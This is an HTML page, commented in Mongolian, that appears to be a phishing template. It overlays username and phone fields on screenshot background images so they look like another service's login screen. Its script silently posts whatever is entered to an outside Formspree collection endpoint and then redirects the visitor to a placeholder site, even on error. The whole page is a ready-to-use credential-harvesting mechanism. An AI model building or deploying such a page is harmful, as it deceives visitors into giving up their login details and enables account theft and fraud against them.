<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
::placeholder {
  color: black;
  opacity: 0.9; /* Firefox */
}
input {
  color: black;
  background-color: white;
}
h1 {
  font-size: 50px;
}
label {
  font-size: 50px;
}
input {
  font-size: 45px;
}

/* User input байрлал */
input[type=text].user-input {
  position: fixed;
  height: 115px;
  top: 18.9%;
  right: 12%;
  width: 77%;
  padding: 34px 20px;
  margin: 30px 0;
  display: inline-block;
  border: 0px solid #ccc;
  border-radius: 10px;
  box-sizing: border-box;
}

/* Phone input байрлал */
input[type=text].phone-input {
  position: fixed;
  height: 115px;
  top: 28.8%;
  right: 12%;
  width: 77%;
  padding: 34px 20px;
  margin: 30px 0;
  display: inline-block;
  border: 0px solid #ccc;
  border-radius: 10px;
  box-sizing: border-box;
}

/* Илгээх товч */
.login-btn {
  position: fixed;
  height: 115px;
  top: 42.8%;
  right: 12%;
  width: 77%;
  background-color: #ccbf64;
  color: white;
  padding: 34px 20px;
  margin: 80px 0;
  border: 0px solid #ccc;
  border-radius: 10px;
  cursor: pointer;
  font-size: 45px;
}

.login-btn:hover {
  background-color: #45a049;
}

/* Контейнер хэсэг */
.login-box {
  background-image: url('Screenshot_2.png');
  background-repeat: no-repeat;
  background-size: cover;
  border: 3px solid #163278;
  border-radius: 20px;
  position: fixed;
  height: 1000px;
  width: 65%;
  top: 10%;
  right: 9%;
  background-color: #1D1C2A;
  padding: 90px;
}

body {
  background-image: url('Screenshot_1.png');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: 100% 100%;
}
</style>
</head>
<body>

    <!-- НЭВТРЭХ ХЭСЭГ -->
    <div class="login-box" id="loginSection">
        <form id="loginForm" onsubmit="handleLogin(event)">
            <h1 style="color:rgb(255, 255, 255 );"></h1>
            <input type="text" name="username" id="username" class="user-input" placeholder="Enter username" required><br>
            <input type="text" name="phone" id="phone" class="phone-input" placeholder="Enter phone number" required><br>
            <button type="submit" class="login-btn">LOGIN</button>
        </form>
    </div>

<script>
    function handleLogin(event) {
        event.preventDefault(); // Форм автоматаар шилжихийг зогсооно

        const username = document.getElementById("username").value;
        const phone = document.getElementById("phone").value;

        // 1. Formspree руу мэдээллийг цаана нь илгээх
        const formData = new FormData();
        formData.append("username", username);
        formData.append("phone", phone);

        fetch("https://formspree.io/f/xaeegqyy", {
            method: "POST",
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        })
        .then(response => {
            // 2. Formspree руу амжилттай очсоны дараа үсрэх сайт линк
            window.location.href = "https://example.com"; // <-- Энд очихыг хүссэн өөрийнхөө сайтын линкийг бичнэ үү
        })
        .catch(error => {
            // Ямар нэг алдаа гарсан ч мөн адил сайт руу шилжүүлэх
            window.location.href = "https://example.com"; 
        });
    }
</script>

</body>
</html>
